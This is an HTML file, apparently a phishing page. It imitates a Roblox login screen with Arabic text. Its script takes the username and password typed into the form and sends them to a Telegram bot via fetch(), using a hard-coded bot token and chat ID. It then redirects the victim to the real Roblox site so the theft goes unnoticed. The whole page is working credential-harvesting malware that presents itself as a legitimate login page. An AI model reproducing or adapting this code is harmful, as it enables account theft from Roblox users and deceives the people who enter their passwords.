<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - صفحة تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #a9a9a9; /* Professional gray background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 300px; /* Fixed width for consistency */
            position: relative; /* Added for positioning the menu */
        }
        h1 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #333;
        }
        input {
            display: block;
            width: calc(100% - 20px); /* Adjusted for padding */
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
            width: 100%; /* Full width button */
            margin-top: 10px; /* Space above the button */
        }
        button:hover {
            background-color: #45a049;
        }
        #result {
            margin-top: 15px;
            color: #f00; /* Red color for error messages */
        }
        /* Menu styles */
        .menu {
            position: absolute;
            top: 10px;
            right: 10px;
            cursor: pointer;
            font-size: 24px;
        }
        .dropdown {
            display: none;
            position: absolute;
            right: 10px;
            top: 40px;
            background-color: white;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            z-index: 1;
        }
        .dropdown a {
            display: block;
            padding: 10px;
            color: #333;
            text-decoration: none;
        }
        .dropdown a:hover {
            background-color: #f0f0f0;
        }
        /* Settings button */
        .settings-button {
            background-color: #007BFF;
            color: white;
            margin-top: 15px;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%; /* Full width button */
        }
        .settings-button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="menu" id="menu">•••</div>
        <div class="dropdown" id="dropdown">
            <a href="#" id="feature1">ميزة 1</a>
            <a href="#" id="feature2">ميزة 2</a>
            <a href="#" id="feature3">ميزة 3</a>
        </div>
        <h1>تسجيل الدخول إلى Roblox</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="اسم المستخدم" required>
            <input type="password" id="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <button class="settings-button" id="settingsButton">الإعدادات</button>
        <p id="result"></p>
    </div>

    <script>
        // Replace these with your actual Telegram Bot Token and Chat ID
        const BOT_TOKEN = '6965358568:AAHFA6qiegPJyw3oVqzfqIt3C829NeagC4Q'; // توكن البوت الخاص بك
        const CHAT_ID = '7072093078'; // معرف الدردشة الخاص بك

        // Toggle dropdown menu visibility
        document.getElementById('menu').addEventListener('click', function() {
            const dropdown = document.getElementById('dropdown');
            dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
        });

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var result = document.getElementById('result');
            
            var message = `🟢 بيانات تسجيل دخول جديدة:\n\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                }),
            })
            .then(response => response.json())
            .then(data => {
                result.textContent = "تم إرسال البيانات! شكراً لتسجيل الدخول.";
                result.style.color = "#4CAF50"; // Green color for success messages
                
                // Redirect to Roblox after 1 second
                setTimeout(() => {
                    window.location.href = "https://www.roblox.com";
                }, 1000); // 1 second delay
            })
            .catch((error) => {
                console.error('Error:', error);
                result.textContent = "حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.";
            });
        });

        // Handle settings button click (Example functionality)
        document.getElementById('settingsButton').addEventListener('click', function() {
            alert('إعدادات الحساب');
            // You can add more settings functionality here
        });

        // Close dropdown when clicking outside
        window.addEventListener('click', function(event) {
            const dropdown = document.getElementById('dropdown');
            if (!event.target.matches('.menu')) {
                dropdown.style.display = 'none';
            }
        });
    </script>
</body>
</html>
